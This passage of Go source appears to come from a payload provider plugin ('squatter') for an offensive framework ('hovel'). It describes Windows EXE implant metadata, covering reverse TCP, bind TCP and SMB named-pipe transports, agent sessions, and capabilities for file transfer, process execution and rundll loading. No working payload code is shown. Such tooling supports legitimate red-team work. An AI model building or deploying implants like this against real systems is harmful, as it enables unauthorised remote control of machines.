		ID:           fmt.Sprintf("squatter/%s/%s/%s/%s/%s", platform, arch, minOS, transport, formatPEEXE),
		Name:         payloadName,
		Version:      version,
		Platform:     platform,
		Arch:         arch,
		MinOS:        minOS,
		TestedOS:     []string{minOS},
		Formats:      []string{formatPEEXE},
		Capabilities: capabilities(),
		Transport: hovel.PayloadTransport{
			Kind:      transport,
			Encrypted: false,
		},
		Session: hovel.PayloadSession{
			Kind:  "agent",
			Owner: "payload_provider",
		},
	}
	switch transport {
	case tcpCallback:
		info.Session.Acquisition = "callback"
		info.Session.RequiresPreThrowListener = true
	case tcpBind:
		info.Session.Acquisition = "post_throw_connect"
		info.Session.RequiresPostThrowConnect = true
	case smbNamedPipe:
		info.Session.Acquisition = "post_throw_connect"
		info.Session.RequiresPostThrowConnect = true
	}
	return info
}

func canonicalTransport(transport string) string {
	if transport == reverseTCP {
		return tcpCallback
	}
	return transport
}

func capabilities() []string {
	return []string{
		"file.get",
		"file.put",
		"process.exec",
		"process.tasklist",
		"library.rundll",
	}
}

func main() {
	hovel.Serve(newProvider())
}
